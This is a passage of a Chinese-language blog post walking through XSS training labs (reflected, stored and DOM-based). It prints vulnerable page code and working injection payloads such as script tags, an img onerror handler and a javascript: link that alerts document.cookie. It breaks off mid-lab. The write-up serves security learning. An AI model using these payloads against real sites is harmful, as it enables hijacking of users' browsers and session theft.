class="toc-number">4.2.2.</span> <span class="toc-text">存储型XSS——利用锚点href属性注入（双引号被HTML编码）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-9"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-9"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Canonical-%E9%93%BE%E6%8E%A5%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.3.</span> <span class="toc-text">Canonical 链接标签中的反射型 XSS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-10"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-10"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">JavaScript上下文中的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%A2%AB%E8%BD%AC%E4%B9%89%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB%EF%BC%88%E5%B5%8C%E5%85%A5JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%89"><span class="toc-number">4.3.1.</span> <span class="toc-text">单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-6"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-6"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%B3%A8%E5%85%A5%E5%88%B0JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E4%B8%94%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%B7%B2HTML%E7%BC%96%E7%A0%81"><span class="toc-number">4.3.2.</span> <span class="toc-text">反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-7"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-7"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%BB%8F%E8%BF%87HTML%E7%BC%96%E7%A0%81%EF%BC%88%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%89%E4%B8%94%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BD%AC%E4%B9%89%E7%9A%84JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%8E%AF%E5%A2%83"><span class="toc-number">4.3.3.</span> <span class="toc-text">反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-8"><span class="toc-number">4.3.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-8"><span class="toc-number">4.3.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%9AJavaScript-URL%E4%B8%AD%E9%83%A8%E5%88%86%E5%AD%97%E7%AC%A6%E8%A2%AB%E6%8B%A6%E6%88%AA%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">4.3.4.</span> <span class="toc-text">反射型XSS：JavaScript URL中部分字符被拦截的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-9"><span class="toc-number">4.3.4.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-9"><span class="toc-number">4.3.4.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">HTML实体编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%EF%BC%8C%E6%B3%A8%E5%85%A5%E5%88%B0onclick%E4%BA%8B%E4%BB%B6%E4%B8%AD%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%B0%96%E6%8B%AC%E5%8F%B7%EF%BC%88%EF%BC%89%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%88%E2%80%9D%EF%BC%89%E8%A2%ABHTML%E7%BC%96%E7%A0%81%EF%BC%8C%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%88%E2%80%99%EF%BC%89%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%EF%BC%88-%EF%BC%89%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">4.4.1.</span> <span class="toc-text">存储型XSS攻击，注入到onclick事件中，其中尖括号（&lt;&gt;）和双引号（”）被HTML编码，单引号（’）和反斜杠（\）被转义</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-10"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-10"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.5.</span> <span class="toc-text">JavaScript模板字符串中的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%B3%A8%E5%85%A5%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E5%B0%96%E6%8B%AC%E5%8F%B7%E3%80%81%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%9D%87%E8%A2%ABUnicode%E8%BD%AC%E4%B9%89%EF%BC%89"><span class="toc-number">4.5.1.</span> <span class="toc-text">反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-11"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-11"><span class="toc-number">4.5.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AngularJS%E7%9A%84%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">AngularJS的沙盒逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84AngularJS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%94%BB%E5%87%BB"><span class="toc-number">5.1.</span> <span class="toc-text">无字符串的AngularJS沙箱逃逸攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-12"><span class="toc-number">5.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-12"><span class="toc-number">5.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">XSS漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XSS%E7%AA%83%E5%8F%96Cookie"><span class="toc-number">6.1.</span> <span class="toc-text">利用XSS窃取Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-13"><span class="toc-number">6.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-13"><span class="toc-number">6.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XSS%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text">利用XSS漏洞获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-14"><span class="toc-number">6.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-14"><span class="toc-number">6.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-XSS-%E7%BB%95%E8%BF%87-CSRF-%E9%98%B2%E5%BE%A1"><span class="toc-number">6.3.</span> <span class="toc-text">利用 XSS 绕过 CSRF 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-15"><span class="toc-number">6.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-15"><span class="toc-number">6.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">7.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-18-Basic-%E9%97%A8%E9%85%B1%E6%83%B3%E7%8E%A9%E4%BB%80%E4%B9%88%E5%91%A2%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">[NSSRound#18 Basic]门酱想玩什么呢？</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        XSS
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wArn</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-07-23T23:32:01.000Z" class="dt-published" itemprop="datePublished">2025-07-24</time>
        
        (Updated: <time datetime="2025-08-08T01:39:03.539Z" class="dt-updated" itemprop="dateModified">2025-08-08</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/XSS/">XSS</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>该实验室包含搜索功能中的一个简单的反映型跨站点脚本漏洞。</p>
<p>为了解决实验问题，执行调用该函数的跨站点脚本攻击<code>alert</code>。</p>
<h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>当我们在搜索框输入123：</p>
<img src="/XSS/XSS/image-20250725110101686.png" class="" title="image-20250725110101686">

<p>服务器会回显我们输入的内容。</p>
<p>如果我们输入：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<img src="/XSS/XSS/image-20250725110228311.png" class="" title="image-20250725110228311">

<p>做到这里，实验就完成了。</p>
<blockquote>
<p>如果我们诱导其他人访问这个链接，我们的恶意代码就会在别人的浏览器上执行，这就造成了XSS攻击。</p>
</blockquote>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="实验要求：-1"><a href="#实验要求：-1" class="headerlink" title="实验要求："></a>实验要求：</h3><p>该实验室包含评论功能中的存储跨站点脚本漏洞。</p>
<p>为了解决这个实验，请提交一条评论，在查看博客文章的评论时调用<code>alert</code>函数。</p>
<h3 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h3><p>点击一篇博客的view post。</p>
<img src="/XSS/XSS/image-20250726225005681.png" class="" title="image-20250726225005681">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comment: &lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>其他内容随便输入，但是要注意格式。</p>
<p>现在提交评论，并返回查看评论，触发alert函数，实验到此结束。</p>
<blockquote>
<p>存储型XSS相比较反射型XSS攻击更加危险，反射型XSS还需要我们去诱导受害者访问，存储型XSS是直接保存到服务器上的，当别人查看时，会自动触发。</p>
</blockquote>
<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><h3 id="基于document-write接收器的DOM-XSS攻击，使用location-search作为攻击源"><a href="#基于document-write接收器的DOM-XSS攻击，使用location-search作为攻击源" class="headerlink" title="基于document.write接收器的DOM XSS攻击，使用location.search作为攻击源"></a>基于<code>document.write</code>接收器的DOM XSS攻击，使用<code>location.search</code>作为攻击源</h3><h4 id="实验要求：-2"><a href="#实验要求：-2" class="headerlink" title="实验要求："></a>实验要求：</h4><p>此实验室包含一个基于 DOM 的跨站点脚本漏洞，该漏洞存在于搜索查询跟踪功能中。该漏洞利用 JavaScript的<code>document.write</code>函数将数据写入页面。该<code>document.write</code>函数调用来自<code>location.search</code>的数据，我们可以通过网站URL控制该数据源。</p>
<p>为了解决这个实验，请发起一个执行alert函数的跨站点脚本攻击。</p>
<h4 id="实验过程：-2"><a href="#实验过程：-2" class="headerlink" title="实验过程："></a>实验过程：</h4><p>在搜索页面，输入test123：</p>
<img src="/XSS/XSS/image-20250727091021107.png" class="" title="image-20250727091021107">

<p>f12，打开开发者工具，发现如下javascript代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trackSearch</span>(<span class="params">query</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+query+<span class="string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>); <span class="comment">// 获取search参数</span></span><br><span class="line"><span class="keyword">if</span>(query) &#123;</span><br><span class="line">    <span class="title function_">trackSearch</span>(query); <span class="comment">// 调用trackSearch插入数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过”&gt;&lt;”闭合：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/resources/images/tracker.gif?searchTerms=&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727091921196.png" class="" title="image-20250727091921196">

<p>到此实验完成。</p>
<h3 id="基于document-write接收器的DOM-XSS-攻击，在select元素内利用location-search作为攻击源"><a href="#基于document-write接收器的DOM-XSS-攻击，在select元素内利用location-search作为攻击源" class="headerlink" title="基于document.write接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源"></a>基于<code>document.write</code>接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源</h3><h4 id="实验要求：-3"><a href="#实验要求：-3" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验在库存查询功能中存在一个基于DOM的XSS漏洞。该漏洞使用了JavaScript的document.write函数向页面写入数据，而该函数调用了来自location.search的可控数据（您可以通过网站URL控制此参数），这些数据被包裹在select元素内。</p>
<p>要完成本实验，请构造一个能逃逸select元素并执行alert函数的XSS攻击。</p>
<h4 id="实验过程：-3"><a href="#实验过程：-3" class="headerlink" title="实验过程："></a>实验过程：</h4><p>进入实验：</p>
<img src="/XSS/XSS/image-20250727094459612.png" class="" title="image-20250727094459612">

<p>点击View details按钮：</p>
<img src="/XSS/XSS/image-20250727094649167.png" class="" title="image-20250727094649167">

<p>可以检测库存，f12打开开发者工具，发现如下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stores = [<span class="string">&quot;London&quot;</span>,<span class="string">&quot;Paris&quot;</span>,<span class="string">&quot;Milan&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> store = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;storeId&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(store) &#123;</span><br><span class="line">    <span class="comment">// store 存在 </span></span><br><span class="line">    <span class="comment">// 向页面写入 &#x27;&lt;option selected&gt;&#x27;+store+&#x27;&lt;/option&gt;&#x27;</span></span><br><span class="line">    <span class="comment">// 存在 XSS 漏洞</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;stores.<span class="property">length</span>;i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(stores[i] === store) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option&gt;&#x27;</span>+stores[i]+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/select&gt;&#x27;</span>);                          </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">storeId=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727102626335.png" class="" title="image-20250727102626335">

<p>实验完成。</p>
<h3 id="基于location-search源通过innerHTML接收器触发的DOM型XSS漏洞"><a href="#基于location-search源通过innerHTML接收器触发的DOM型XSS漏洞" class="headerlink" title="基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞"></a>基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞</h3><h4 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求:"></a>实验要求:</h4><p>本实验的博客搜索功能存在一个基于DOM的XSS漏洞。该漏洞通过<code>innerHTML</code>赋值操作，使用来自<code>location.search</code>的数据动态修改了div元素的HTML内容。</p>
<p>要完成本实验，请构造一个能够执行<code>alert</code>函数的跨站脚本攻击。</p>
<h4 id="实验过程：-4"><a href="#实验过程：-4" class="headerlink" title="实验过程："></a>实验过程：</h4><p>根据实验要求了解到，博客的搜索功能存在DOM型的XSS漏洞。</p>
<p>在搜索框中输入123：</p>
<img src="/XSS/XSS/image-20250727105438480.png" class="" title="image-20250727105438480">

<p>按f12，打开开发者工具：</p>
<img src="/XSS/XSS/image-20250727105608795.png" class="" title="image-20250727105608795">

<p>发现一段js代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doSearchQuery</span>(<span class="params">query</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;searchMessage&#x27;</span>).<span class="property">innerHTML</span> = query; <span class="comment">// 接收器 innerHTML</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> query = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line"><span class="comment">// 攻击源</span></span><br><span class="line"><span class="keyword">if</span>(query) &#123;</span><br><span class="line">    <span class="title function_">doSearchQuery</span>(query);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>innerHTML 已经不在执行secript标签，我们要换一种形式执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&lt;img src=1 onerror=alert(document.domain) /&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727110104657.png" class="" title="image-20250727110104657">

<p>src是路径，由于这是一个非法路径，img标签肯定会解析失败，解析失败触发onerror事件，执行alert函数。</p>
<h3 id="利用location-search攻击jQuery的a标签href属性导致的DOM型XSS漏洞"><a href="#利用location-search攻击jQuery的a标签href属性导致的DOM型XSS漏洞" class="headerlink" title="利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞"></a>利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞</h3><h4 id="实验要求：-4"><a href="#实验要求：-4" class="headerlink" title="实验要求："></a>实验要求：</h4><p>本实验在”用户反馈提交页面”存在一个基于DOM的XSS漏洞。该漏洞通过jQuery库的<code>$</code>选择器定位a标签，并利用<code>location.search</code>的数据动态修改其<code>href</code>属性。</p>
<p>要完成此实验，请构造攻击使页面中的”返回”链接被篡改，点击时触发<code>alert(document.cookie)</code>。</p>
<h4 id="实验过程：-5"><a href="#实验过程：-5" class="headerlink" title="实验过程："></a>实验过程：</h4><img src="/XSS/XSS/image-20250727114012736.png" class="" title="image-20250727114012736">

<p>在提交反馈界面存在DOM的XSS漏洞，点击Submit freeback，按F12，打开开发者工具：</p>
<img src="/XSS/XSS/image-20250727114159206.png" class="" title="image-20250727114159206">

<p>发现js代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#backLink&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>, (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;returnPath&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 将returnPath的值设置给href属性，href属性设置在id为#backLink的a标签中。</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250727114615500.png" class="" title="image-20250727114615500">

<p>发送此链接：</p>
<img src="/XSS/XSS/image-20250727114711283.png" class="" title="image-20250727114711283">

<p>点击链接，触发alert(document.cookie)函数，实验完成。</p>
<h3 id="利用-hashchange-事件在-jQuery-选择器接收器中触发的-DOM-XSS-漏洞"><a href="#利用-hashchange-事件在-jQuery-选择器接收器中触发的-DOM-XSS-漏洞" class="headerlink" title="利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞"></a>利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞</h3><h4 id="实验要求：-5"><a href="#实验要求：-5" class="headerlink" title="实验要求："></a>实验要求：</h4><p>“该实验在主页上存在一个基于 DOM 的跨站脚本（XSS）漏洞。它使用 jQuery 的 <code>$()</code> 选择器函数自动滚动到指定帖子，帖子标题通过 <code>location.hash</code> 属性传递。</p>
<p>要完成实验，需向受害者投递一个漏洞利用代码，在其浏览器中调用 <code>print()</code> 函数。”</p>
<h4 id="实验过程：-6"><a href="#实验过程：-6" class="headerlink" title="实验过程："></a>实验过程：</h4><p>进入实验环境，按f12打开开发者工具，进入源码：</p>
<img src="/XSS/XSS/image-20250728090148823.png" class="" title="image-20250728090148823">

<p><code>Ctrl+F</code> 搜索 <code>script</code> 。</p>
<img src="/XSS/XSS/image-20250728090350901.png" class="" title="image-20250728090350901">

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">监听窗口的hashchange事件</span></span><br><span class="line"><span class="comment">window.location.hash 